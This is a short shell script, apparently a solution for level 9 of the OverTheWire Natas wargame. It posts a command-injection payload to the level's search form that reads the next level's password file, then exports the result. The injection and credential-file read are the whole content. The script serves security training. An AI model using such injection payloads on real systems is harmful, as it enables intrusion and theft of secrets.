#!/bin/echo Please source

export natas10pass=$(curl -d "submit&needle=; printf 'passwd: '; cat /etc/natas_webpass/natas10 #" -X POST -s -u natas9:$natas9pass natas9.natas.labs.overthewire.org/ | grep passwd | sed 's/passwd: //')
echo natas10: $natas10pass
